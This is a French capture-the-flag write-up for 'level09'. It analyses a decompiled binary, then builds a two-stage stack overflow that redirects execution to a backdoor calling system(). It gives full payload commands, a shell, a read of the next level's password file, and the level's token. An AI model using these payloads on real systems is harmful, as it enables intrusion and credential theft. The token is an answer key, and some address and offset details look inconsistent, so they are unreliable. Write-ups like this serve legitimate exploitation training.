# LEVEL 09

## Analyse du code

### Code décompilé (Ghidra) puis traduit en C

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void secret_backdoor(void)
{
    char buffer[128];
    
    fgets(buffer, 0x80, stdin);
    system(buffer);
}

void set_username(char *data)
{
    char username_buffer[140];
    int i;
    
    memset(username_buffer, 0, sizeof(username_buffer));
    
    puts(">: Enter your username");
    printf(">>: ");
    fgets(username_buffer, 0x80, stdin);
    
    // Copier jusqu'à 41 caractères (0x29) dans data + 0x8c (offset 140)
    for (i = 0; i < 0x29 && username_buffer[i] != '\0'; i++) {
        data[0x8c + i] = username_buffer[i];
    }
    
    printf(">: Welcome, %s", data + 0x8c);
}

void set_msg(char *data)
{
    char message_buffer[1024];
    
    memset(message_buffer, 0, sizeof(message_buffer));
    
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(message_buffer, 0x400, stdin);
    
    // Copier le message en utilisant la longueur stockée à data + 0xb4 (offset 180)
    strncpy(data, message_buffer, *(int *)(data + 0xb4));
}

void handle_msg(void)
{
    char buffer[140];         // local_c8
    long padding1;            // local_3c
    long padding2;            // local_34
    long padding3;            // local_2c
    long padding4;            // local_24
    long padding5;            // local_1c
    int msg_len;              // local_14
    
    padding1 = 0;
    padding2 = 0;
    padding3 = 0;
    padding4 = 0;
    padding5 = 0;
    msg_len = 0x8c;  // 140 en décimal
    
    set_username(buffer);
    set_msg(buffer);
    puts(">: Msg sent!");
}

int main(void)
{
    puts("--------------------------------------------\n"
         "|   ~Welcome to l33t-m$n ~    v1337        |\n"
         "--------------------------------------------");
    handle_msg();
    return 0;
}
```

---

## Identification des vulnérabilités

### 1. Buffer Overflow dans `set_username()`

**Ligne critique :**
```c
for (i = 0; i < 0x29 && username_buffer[i] != '\0'; i++) {
    data[0x8c + i] = username_buffer[i];  // Écrit à buffer + 140 !
}
```

**Problème :** La fonction écrit à `data + 0x8c` (offset 140), mais le buffer ne fait que 140 octets. On écrit donc **en dehors du buffer**, directement dans les variables locales de la stack !

### 2. Longueur de copie contrôlée par l'utilisateur

**Ligne critique :**
```c
strncpy(data, message_buffer, *(int *)(data + 0xb4));
```

**Problème :** La longueur de copie est lue depuis `data + 0xb4` (offset 180), c'est-à-dire la variable `msg_len` que nous pouvons modifier via `set_username()` !

### 3. Fonction `secret_backdoor()` non utilisée

```c
void secret_backdoor(void)
{
    char buffer[128];
    fgets(buffer, 0x80, stdin);
    system(buffer);  // Exécute n'importe quelle commande !
}
```

**Observation :** Cette fonction n'est jamais appelée dans le programme... mais on va l'appeler nous-même ! 🎯

---

## Structure de la Stack

### Layout de `handle_msg()`

```
Offset   | Variable          | Taille
---------|-------------------|--------
0-139    | buffer[140]       | 140 octets
140-147  | padding1 (long)   | 8 octets   ← ⚠️ On écrit ICI avec set_username()
148-155  | padding2 (long)   | 8 octets
156-163  | padding3 (long)   | 8 octets
164-171  | padding4 (long)   | 8 octets
172-179  | padding5 (long)   | 8 octets
180-183  | msg_len (int)     | 4 octets   ← ⚠️ CIBLE 1 : Modifier cette valeur
184-191  | [alignement]      | 8 octets
192-199  | saved RBP         | 8 octets
200-207  | return address    | 8 octets   ← ⚠️ CIBLE 2 : Pointer vers secret_backdoor
```

---

## Exploitation

### Stratégie : Ret2win en 2 étapes

1. **Première étape :** Modifier `msg_len` via `set_username()` pour permettre un grand overflow
2. **Deuxième étape :** Overflow via `set_msg()` pour écraser la return address avec l'adresse de `secret_backdoor()`

### Étape 1 : Trouver l'adresse de `secret_backdoor`

```bash
gdb ./level09
b main
r
p secret_backdoor
```

**Exemple de résultat :**
```
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

**Adresse trouvée :** `0x55555555488c`

### Étape 2 : Premier payload (Username)

**Objectif :** Modifier `msg_len` pour permettre un overflow

**Calcul :**
- `set_username()` écrit à offset 140
- `msg_len` est à offset 180
- Distance : `180 - 140 = 40 octets`

**Payload :**
```bash
python -c "print('A'*40 + '\xf4\x01\x00\x00')"
```

**Décomposition :**
- `'A'*40` : Padding de 40 octets (offset 140 → 179)
- `'\xf4\x01\x00\x00'` : Valeur 500 (0x01f4) en little-endian

**Résultat :** `msg_len = 500` au lieu de 140 !

### Étape 3 : Second payload (Message)

**Objectif :** Écraser la return address

**Calcul :**
- Return address est à offset ~200
- Avec `msg_len = 500`, on peut écrire 500 octets
- On remplit 200 octets puis on place l'adresse de `secret_backdoor`

**Payload :**
```bash
python -c "print('B'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')"
```

**Décomposition :**
- `'B'*200` : Padding jusqu'à la return address
- `'\x8c\x48\x55\x55\x55\x55\x00\x00'` : Adresse `0x55555555488c` en little-endian

### Étape 4 : Garder stdin ouvert

```bash
cat
```

Cette commande garde stdin ouvert pour qu'on puisse envoyer des commandes à `secret_backdoor()` après la redirection.

---

## Solution complète

### Exploitation en une seule commande

```bash
(python -c "print('A'*40 + '\xf4\x01\x00\x00')"; python -c "print('B'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')"; cat) | ./level09
```

### Explication étape par étape

```
1. Programme démarre → handle_msg()
   ↓
2. set_username() lit notre premier payload
   ↓
3. Écrit 'A'*40 + 500 à partir de l'offset 140
   → msg_len = 500 ✓
   ↓
4. set_msg() lit notre second payload
   ↓
5. Copie 500 octets au lieu de 140
   → Overflow jusqu'à la return address ✓
   ↓
6. handle_msg() fait return
   ↓
7. CPU lit la return address : 0x55555555488c
   ↓
8. Saute à secret_backdoor() au lieu de retourner à main() ✓
   ↓
9. secret_backdoor() fait fgets() puis system()
   ↓
10. On peut maintenant exécuter des commandes !
```

### Commandes à exécuter après exploitation

Une fois le shell obtenu dans `secret_backdoor()`, taper :

```bash
cat /home/users/end/.pass
```

ou

```bash
/bin/sh
```

---

## Schéma de l'attaque

### Avant l'attaque

```
Stack de handle_msg():
┌─────────────────┐
│ buffer[140]     │ ← set_username() devrait écrire ici
├─────────────────┤
│ padding (40)    │
├─────────────────┤
│ msg_len = 140   │ ← Longueur normale
├─────────────────┤
│ saved RBP       │
├─────────────────┤
│ return → main() │ ← Retour normal vers main()
└─────────────────┘
```

### Après le premier payload (Username)

```
Stack de handle_msg():
┌─────────────────┐
│ buffer[140]     │ 
├─────────────────┤
│ AAAAAAAAAA...   │ ← 40 'A' écrits par set_username()
├─────────────────┤
│ msg_len = 500   │ ← ⚠️ MODIFIÉ !
├─────────────────┤
│ saved RBP       │
├─────────────────┤
│ return → main() │
└─────────────────┘
```

### Après le second payload (Message)

```
Stack de handle_msg():
┌─────────────────┐
│ BBBBBBBBBB...   │ ← Overflow de 200 'B'
├─────────────────┤
│ BBBBBBBBBB...   │
├─────────────────┤
│ BBBBBBBBBB...   │
├─────────────────┤
│ BBBBBBBBBB...   │
├─────────────────┤
│ 0x55555555488c  │ ← ⚠️ Return address écrasée !
└─────────────────┘
          ↓
    secret_backdoor() ✓
```

---

## Concepts clés

### 1. Buffer Overflow

Un **buffer overflow** se produit quand on écrit plus de données qu'un buffer peut en contenir, écrasant ainsi les données adjacentes en mémoire.

### 2. Return Address Hijacking

La **return address** est l'adresse où le programme doit retourner après l'exécution d'une fonction. En l'écrasant, on peut rediriger l'exécution vers n'importe où.

### 3. Ret2win

**Ret2win** (Return-to-win) est une technique où on redirige l'exécution vers une fonction "gagnante" qui donne accès au système (ici `secret_backdoor`).

### 4. Little-endian

Sur les architectures x86/x64, les adresses sont stockées en **little-endian** : l'octet le moins significatif en premier.

**Exemple :**
```
Adresse : 0x55555555488c
En mémoire : \x8c\x48\x55\x55\x55\x55\x00\x00
```

---

## Token level09

```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

---

## Notes supplémentaires

### Pourquoi offset 200 ?

L'offset exact dépend de plusieurs facteurs :
- Alignement de la stack (généralement 16 octets)
- Présence d'un stack canary (8 octets)
- Architecture (32 vs 64 bits)

Pour trouver l'offset exact, on peut tester différentes valeurs :
```bash
# Test avec offset 184, 192, 200, 208
for offset in 184 192 200 208; do
    echo "Test offset $offset:"
    (python -c "print('A'*40 + '\xf4\x01\x00\x00')"; \
     python -c "print('B'*$offset + '\x8c\x48\x55\x55\x55\x55\x00\x00')"; \
     echo "whoami") | ./level09
done
```

### Protection PIE (Position Independent Executable)

Si le binaire a PIE activé, l'adresse de `secret_backdoor` change à chaque exécution. Dans ce cas :
1. Il faudrait d'abord leak une adresse
2. Calculer l'offset vers `secret_backdoor`
3. Construire le payload avec l'adresse calculée

Heureusement, ce niveau n'a pas PIE activé ! 🎉

